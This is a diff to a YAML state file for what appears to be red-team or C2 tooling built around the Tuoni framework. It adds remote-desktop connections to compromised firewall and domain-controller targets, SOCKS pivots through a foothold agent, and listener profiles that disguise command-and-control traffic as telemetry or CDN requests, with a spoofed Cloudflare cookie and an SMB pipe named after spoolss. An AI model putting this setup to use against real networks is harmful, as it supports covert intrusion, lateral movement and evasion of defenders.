@@ -110,6 +110,61 @@ lateral_moves:
     timestamp: "2026-10-30T15:45:00Z"
     agent_id: agent-dc
 
+# Guacamole connection entries — programmatic RDP/SSH/VNC management.
+# Each connection maps to a Guacamole REST API connection object.
+# Credentials resolved from cred_refs[] via cred_ref field — never inline.
+# Optional section — omit if Guacamole not in use.
+guacamole_connections:
+  - hostname: fw-target
+    protocol: rdp          # rdp | ssh | vnc
+    ip: "198.51.100.1"
+    port: 3389
+    cred_ref: cred-001     # reference into cred_refs[]
+    proxy: null             # socks_proxies[].id or null for direct
+    recording: true
+    status: active          # active | removed
+  - hostname: dc-target
+    protocol: rdp
+    ip: "198.51.100.10"
+    port: 3389
+    cred_ref: cred-001
+    proxy: socks-fw         # routed through foothold pivot
+    recording: true
+    status: active
+
+# SOCKS proxy definitions linked to Tuoni footholds.
+# Used by guacamole_connections[].proxy and proxychains generation.
+# Optional section — omit if no pivot routing needed.
+socks_proxies:
+  - id: socks-fw
+    foothold_agent: agent-fw    # tuoni agent providing the tunnel
+    listen_host: "127.0.0.1"
+    listen_port: 1080
+    type: socks5                # socks5 | socks4
+    status: active              # active | down
+    reachable_nets:
+      - "198.51.100.0/24"
+
+# Tuoni listener profiles for C2 diversification.
+# persist-swarm reads these to assign listeners per agent type.
+# Optional section — omit to use default single-listener behavior.
+listeners:
+  - id: https-primary
+    type: reverse_https
+    port: 443
+    uris: ["/api/v2/telemetry", "/cdn/health"]
+    cookie: "__cf_bm"
+    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    sleep: 30
+    jitter: 15
+    tls_cert: letsencrypt     # letsencrypt | self-signed | custom-pkcs12
+    status: active            # active | planned | disabled
+  - id: smb-relay
+    type: bind_smb
+    pipe_name: "\\spoolss_alt"
+    status: active
+    note: "Agent-to-agent lateral, zero external traffic"
+
 # Free-text notes for next session or mode switch
 handoff: |
   Firewall fully compromised with persistence. DC accessed via WMI using
